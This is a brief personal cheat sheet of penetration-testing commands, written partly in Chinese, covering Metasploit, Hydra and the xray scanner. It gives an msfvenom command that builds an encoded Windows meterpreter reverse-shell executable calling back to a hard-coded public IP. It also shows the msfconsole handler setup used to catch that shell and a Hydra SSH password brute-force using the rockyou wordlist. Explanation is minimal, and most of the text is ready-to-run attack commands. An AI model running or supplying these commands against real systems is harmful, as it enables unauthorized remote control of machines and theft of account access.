## GIT
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230705202542.png)


## nmap
## msf
msfvenom生成reverse_shell马
```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=115.236.153.174 LPORT=39063 -b "\x00" -i 10 -f exe -o /tmp/window_remote_hsk.exe
```

监听端口
```shell
msfconsole  //启动
​
use exploit/multi/handler  //开启监听 
​
set payload windows/meterpreter/reverse_tcp  //设置payload，选择漏洞利用模块
​
set lhost 192.168.36.134  //本地IP，即攻击IP
​
set lport 4444  //监听端口
​
exploit   //攻击
```

[msf后渗透测试萌新指南](https://www.anquanke.com/post/id/164525#h3-21)
[msf获取到session后的命令集合](https://blog.csdn.net/qq_39101049/article/details/96854716)

## Hydra

```
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.240.52 ssh
```

## xray
```shell
//基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描
xray webscan --basic-crawler http://example.com --html-output vuln.html
//使用代理
xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
//扫描单个url
xray webscan --url http://example.com?a=b --html-output single-url.html

```